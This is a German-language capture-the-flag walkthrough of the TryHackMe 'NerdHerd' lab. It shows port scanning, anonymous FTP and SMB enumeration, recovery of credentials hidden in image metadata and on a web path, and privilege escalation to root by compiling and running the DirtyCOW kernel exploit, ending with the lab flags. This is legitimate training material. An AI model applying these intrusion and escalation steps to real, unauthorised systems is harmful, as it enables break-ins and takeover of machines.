# NerdHerd
## Enumeration
nmap findet ftp und smb
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ nmap -A -oN nmap 10.10.130.36                                        
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 06:40 EST
Nmap scan report for 10.10.130.36
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.45.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -40m04s, deviation: 1h09m10s, median: -8s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-28T11:40:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2023-02-28T13:40:44+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.24 seconds
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

nmap Scan nach allen Ports findet auch http
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ nmap -p- 10.10.7.17 -T5                                                                                  130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 08:51 EST
Warning: 10.10.7.17 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.7.17
Host is up (0.075s latency).
Not shown: 51854 closed tcp ports (conn-refused), 13676 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 286.26 seconds
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

### ftp
Der Server verwendet vsftpd 3.0.3. Fuer diese Version gibt es keinen brauchbaren Exploit
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ searchsploit vsftpd                                                                                      130 ⨯
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                   | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                   | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                   | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                 | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                          | multiple/remote/49719.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

Verbindet man sich per ftp mit dem System findet man eine Bild- und eine Textdatei.
```
 root  …  tryhackme  writeups  NerdHerd  ftp 10.10.130.36
Connected to 10.10.130.36.
220 (vsFTPd 3.0.3)
Name (10.10.130.36:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
226 Directory send OK.
ftp> get youfoundme.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
226 Transfer complete.
89894 bytes received in 0.161 seconds (545 kbytes/s)
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
226 Directory send OK.
ftp> get hellon3rd.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
226 Transfer complete.
28 bytes received in 0.000345 seconds (79.3 kbytes/s)
ftp>
221 Goodbye.
 root  …  tryhackme  writeups  NerdHerd  cat hellon3rd.txt
all you need is in the leet
 root  …  tryhackme  writeups  NerdHerd  hexdump -C hellon3rd.txt
00000000  61 6c 6c 20 79 6f 75 20  6e 65 65 64 20 69 73 20  |all you need is |
00000010  69 6e 20 74 68 65 20 6c  65 65 74 0a              |in the leet.|
0000001c
 root  …  tryhackme  writeups  NerdHerd  
```

In der Bilddatei findet man allerdings keine Auffaelligkeiten
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ strings -n 10 youfoundme.png
!P\fU5";vp
C}}=jjjP]]
*]BQcBQ#BU
%tEXtdate:create
2010-10-26T08:00:31-07:00
%tEXtdate:modify
2010-10-26T08:00:31-07:00
tEXtSoftware
www.inkscape.org
tEXtEXIF:Orientation
zTXtRaw profile type APP1
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ hexdump -C youfoundme.png | less
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ binwalk -e youfoundme.png                                              

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 894 x 894, 8-bit/color RGBA, non-interlaced
80            0x50            Zlib compressed data, best compression
89740         0x15E8C         Zlib compressed data, default compression

                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

Interessant ist allerdings der _Owner Name_ der Datei.
```
 root  …  tryhackme  writeups  NerdHerd  1  exiftool youfoundme.png
ExifTool Version Number         : 12.50
File Name                       : youfoundme.png
Directory                       : .
File Size                       : 90 kB
File Modification Date/Time     : 2023:02:28 13:15:01+01:00
File Access Date/Time           : 2023:02:28 13:17:31+01:00
File Inode Change Date/Time     : 2023:02:28 13:15:01+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 894
Image Height                    : 894
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
EXIF Orientation                : 1
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Owner Name                      : fijbxslz
Image Size                      : 894x894
Megapixels                      : 0.799
 root  …  tryhackme  writeups  NerdHerd  1  
 root  …  tryhackme  writeups  NerdHerd  1  exiv2 -pS youfoundme.png
STRUCTURE OF PNG FILE: youfoundme.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | ...~...~....                   | 0x4a29d914
      33 | bKGD  |       6 | ......                         | 0xa0bda793
      51 | pHYs  |       9 | .........                      | 0x42289b78
      72 | IDAT  |   32768 | x...w.T..?...3s..lc......".... | 0x2ed7e1fa
   32852 | IDAT  |   32768 | ...I... ....)...P...S.V8..w... | 0x027395c4
   65632 | IDAT  |   23900 | D.Q....4aY.....(.........QG..0 | 0x203de49f
   89544 | tEXt  |      37 | date:create.2010-10-26T08:00:3 | 0xa1c69934
   89593 | tEXt  |      37 | date:modify.2010-10-26T08:00:3 | 0xd09b2188
   89642 | tEXt  |      25 | Software.www.inkscape.org      | 0x9bee3c1a
   89679 | tEXt  |      18 | EXIF:Orientation.1             | 0x8458ecef
   89709 | zTXt  |     161 | Raw profile type APP1..x.eO[.. | 0x877a5801
   89882 | IEND  |       0 |                                | 0xae426082
 root  …  tryhackme  writeups  NerdHerd  1  
```
Verwendet man bei diesem ein Check Cipher Tool, findet man einen Hinweis auf Vigenere Cipher (https://www.boxentriq.com/code-breaking/cipher-identifier).

### smb
#### Version ermitteln
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ nmap --script "smb-protocols" -p 445 10.10.130.36                      
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 06:53 EST
Nmap scan report for 10.10.130.36
Host is up (0.036s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.130.36:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{6472656e-6568-6472-0000-000000000000}) (authentication domain:NERDHERD)
[*] 10.10.130.36:445      -   Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 
```

#### Shares
Share gefunden: \\10.10.130.36\nerdherd\_classified

User gefunden: NERDHERD\chuck
```
┌──(kali㉿kali)-[~]
└─$ nmap --script "smb-enum-shares or smb-enum-users" -p 445 10.10.130.36
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 06:55 EST
Nmap scan report for 10.10.130.36
Host is up (0.068s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.130.36\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (nerdherd server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.130.36\nerdherd_classified: 
|     Type: STYPE_DISKTREE
|     Comment: Samba on Ubuntu
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\chuck\nerdherd_classified
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.130.36\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users: 
|   NERDHERD\chuck (RID: 1000)
|     Full name:   ChuckBartowski
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 25.61 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ 
```
Allerdings war es nicht moeglich auf das Share zuzugreifen.

## http
Bei dem http Aufruf erhaelt man eine Nachricht
```html
<script>
function alertFunc() {
  alert("HACKED by 0xpr0N3rd");
  alert("Just kidding silly.. I left something in here for you to find")
}
</script>
```

Am Ende der Seite ist ein Link hinterlegt.
```html
<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>
```

Das Lied ist "Surfin’ Bird" von Trashmen. Aus dem Songtext laesst sich _birdistheword_ ableiten. Dies kann verwendet werden um den Nutzernamen, welcher das zuvor gefundene PNG erstellt hat zu entschluesseln:

Owner Name: fijbxslz -> Vigenere Decode -> easypass

Hierbei handelt es sich um das Kennwort zu dem SMB Share.
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ smbclient //10.10.7.17/nerdherd_classified -U chuck                                                       130 ⨯
Enter WORKGROUP\chuck's password: 
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Thu Sep 10 21:29:53 2020
  ..                                  D        0  Thu Nov  5 15:44:40 2020
  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020

                8124856 blocks of size 1024. 3411696 blocks available
smb: \> get secr3t.txt 
getting file \secr3t.txt of size 125 as secr3t.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> 
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ cat secr3t.txt    
Ssssh! don't tell this anyone because you deserved it this far:

        check out "/this1sn0tadirect0ry"

Sincerely,
        0xpr0N3rd
<3
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/tryhackme/nerdherd]
└─$ 
```

Bei dem _check out_ Verweis handelt es sich um einen URL Pfad. Unter dieser findet man auf dem System die Datei _http://10.10.7.17:1337/this1sn0tadirect0ry/creds.txt_ mit dem Inhalt:
```
alright, enough with the games.

here, take my ssh creds:
	
	chuck : th1s41ntmypa5s
```

Loggt man sich auf dem System ein, findet man im Userverzeichnis die erste Flag:
```
chuck@nerdherd:~$ cat user.txt 
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
chuck@nerdherd:~$ 
```

## Priviledge escalation
Nutzer hat keine sudo Rechte
```
chuck@nerdherd:~$ sudo -l
[sudo] password for chuck: 
Sorry, user chuck may not run sudo on nerdherd.
chuck@nerdherd:~$ 
```

Ungewoehnliche s-bits sind auch nicht zu finden
```
chuck@nerdherd:/home$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Tem 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root 142032 Şub 18  2016 /bin/ntfs-3g
-rwsr-xr-x 1 root root 27608 May 27  2016 /bin/umount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40152 May 27  2016 /bin/mount
-rwsr-xr-- 1 root dip 390888 Oca 29  2016 /usr/sbin/pppd
-rwsr-xr-x 1 root root 10240 Şub 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 18664 Haz 22  2016 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 428240 May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Nis  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Oca 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 23288 Nis 29  2016 /usr/bin/ubuntu-core-launcher
-rwsr-xr-x 1 root root 40432 Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root 136808 May  4  2016 /usr/bin/sudo
-rwsr-xr-x 1 root root 49584 Mar 29  2016 /usr/bin/chfn
-rwsr-xr-x 1 root root 39904 Mar 29  2016 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Oca 18  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75304 Mar 29  2016 /usr/bin/gpasswd
chuck@nerdherd:/home$ 
```

### LinPEAS
Bei dem Scan mit LinPEAS faellt auf, dass der Kernel bzw. die Ubuntu Version veraltet ist -> **Kernel als 95% PE vecotor markiert!**
```
OS: Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
```

### LES
Schwachstellen koennen mit LES ermittelt werden.
```
chuck@nerdherd:~$ ./les.sh

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

### Exploit
Zur Eskalation der Rechte wird DirtyCOW verwendet:
```
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

Hierzu das Programm heruntergeladen und auf das Zielsystem kopiert. Hier dann kompiliert und ausgefuehrt
```
chuck@nerdherd:~$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
chuck@nerdherd:~$ ./dcow -s
Running ...
Password overridden to: dirtyCowFun

Received su prompt (Password: )

root@nerdherd:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@nerdherd:~# cp /tmp/.ssh_bak /etc/passwd
root@nerdherd:~# rm /tmp/.ssh_bak
root@nerdherd:~# id
uid=0(root) gid=0(root) groups=0(root)
root@nerdherd:~# 
```

### Root Flag
Mit den Root Rechten kann nun nach der Flag gesucht werden
```
root@nerdherd:~# ls -al 
total 40
drwx------  5 root root 4096 Kas  5  2020 .
drwxr-xr-x 24 root root 4096 Eyl 11  2020 ..
-rw-r--r--  1 root root 3132 Kas  5  2020 .bash_history
-rw-r--r--  1 root root 3106 Eki 22  2015 .bashrc
drwx------  2 root root 4096 Tem 19  2016 .cache
drwxr-xr-x  2 root root 4096 Eyl 11  2020 .nano
-rw-r--r--  1 root root  148 Ağu 17  2015 .profile
-rw-r--r--  1 root root   62 Eyl 14  2020 root.txt
drwx------  2 root root 4096 Eyl 11  2020 .ssh
-rw-------  1 root root  511 Eyl 11  2020 .viminfo
root@nerdherd:~# cat root.txt 
cmon, wouldnt it be too easy if i place the root flag here?


root@nerdherd:~# find / | grep root.txt
find: ‘/run/user/108/gvfs’: Permission denied
/root/root.txt
/opt/.root.txt
root@nerdherd:~# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
root@nerdherd:~# 
```

### Bonus Flag
Es lohnt sich immer die Bash History der User auf einem System zu betrachten. Fuer den User Chuck lasst sich der folgende Eintrag finden
```
root@nerdherd:~# cat /home/chuck/.bash_history 

service restart ftp
service ftpd restart
why are you looking at my logs????
su 
```

Durchsucht man die History von dem Root User findet man die Flag
```
root@nerdherd:~# cat .bash_history 

ls -la
cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png 
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
mv /home/chuck/Downloads/youfoundme.png .
rm youfoundme.png 
mv /home/chuck/Downloads/youfoundme.png .
clear
```
